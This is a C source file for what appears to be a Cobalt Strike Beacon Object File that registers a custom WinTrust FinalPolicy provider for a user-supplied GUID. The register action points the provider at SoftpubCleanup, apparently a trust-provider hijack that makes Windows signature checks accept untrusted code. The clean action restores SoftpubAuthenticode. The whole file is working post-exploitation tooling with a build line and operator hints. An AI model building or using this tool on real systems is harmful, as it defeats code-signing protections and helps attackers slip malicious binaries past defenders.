/*
 * tmb_custom_provider.c - Custom FinalPolicy action GUID
 *
 * Registers a user-supplied action GUID with FinalPolicy.
 *
 * Args (via BeaconDataParse):
 *   short: action (0 = register, 1 = clean)
 *   char*: guid string
 *
 * Build: x86_64-w64-mingw32-gcc -o bofs/bin/tmb_custom_provider.o -c bofs/src/tmb_custom_provider.c -I bofs/include -Wall -Wno-unused-function
 */

#include "tmb_bof.h"

static void tmb_copy_ascii(char *dst, const char *src, int max) {
    int i = 0;
    if (max <= 0) return;
    if (!src) src = "";
    while (src[i] && i < (max - 1)) {
        dst[i] = src[i];
        i++;
    }
    dst[i] = 0;
}

static void tmb_trim_ascii(char *s) {
    int start = 0, end = 0, i = 0;
    while (s[end]) end++;
    while (s[start] == ' ' || s[start] == '\t') start++;
    while (end > start && (s[end - 1] == ' ' || s[end - 1] == '\t')) end--;
    while (start < end) s[i++] = s[start++];
    s[i] = 0;
}

static BOOL tmb_normalize_guid_ascii(const char *input, char *output, int max) {
    char work[96];
    int i = 0, j = 0, end;

    if (max < 4) return FALSE;
    tmb_copy_ascii(work, input, sizeof(work));
    tmb_trim_ascii(work);
    if (!work[0]) return FALSE;

    end = 0;
    while (work[end]) end++;
    if (work[0] != '{') output[j++] = '{';
    while (i < end && j < (max - 2)) output[j++] = work[i++];
    if (j == 0 || output[j - 1] != '}') output[j++] = '}';
    output[j] = 0;
    return TRUE;
}

void go(char *args, int alen) {
    datap parser;
    short action;
    char *guid_in;
    char guid_ascii[96];
    wchar_t guid_w[96];
    wchar_t path[256];

    if (!tmb_init()) { TMB_ERR("Failed to resolve NT API."); return; }

    BeaconDataParse(&parser, args, alen);
    action = BeaconDataShort(&parser);
    guid_in = BeaconDataExtract(&parser, NULL);

    if (!tmb_normalize_guid_ascii(guid_in, guid_ascii, sizeof(guid_ascii))) {
        TMB_ERR("Please provide a GUID. BOFs cannot generate random GUIDs.");
        return;
    }

    if (!toWideChar(guid_ascii, guid_w, sizeof(guid_w) / sizeof(guid_w[0]))) {
        TMB_ERR("Failed to convert GUID to wide string.");
        return;
    }

    tmb_build_finalpolicy_path(guid_w, path);
    TMB_INFO("Resolved GUID: %s", guid_ascii);

    if (action == 0) {
        STR_WINTRUST(dll);
        STR_SOFTPUBCLEANUP(func);
        if (tmb_reg_write_sip(path, dll, func)) {
            TMB_OK("Custom FinalPolicy provider registered: %s", guid_ascii);
            TMB_INFO("Undo: tmb_custom_provider --clean %s", guid_ascii);
        } else {
            TMB_ERR("Custom provider write failed for %s", guid_ascii);
        }
    } else {
        STR_WINTRUST(dll);
        STR_SOFTPUBAUTHENTICODE(func);
        if (tmb_reg_write_sip(path, dll, func)) {
            TMB_OK("Custom FinalPolicy provider restored: %s", guid_ascii);
        } else {
            TMB_ERR("Custom provider restore failed for %s", guid_ascii);
        }
    }
}
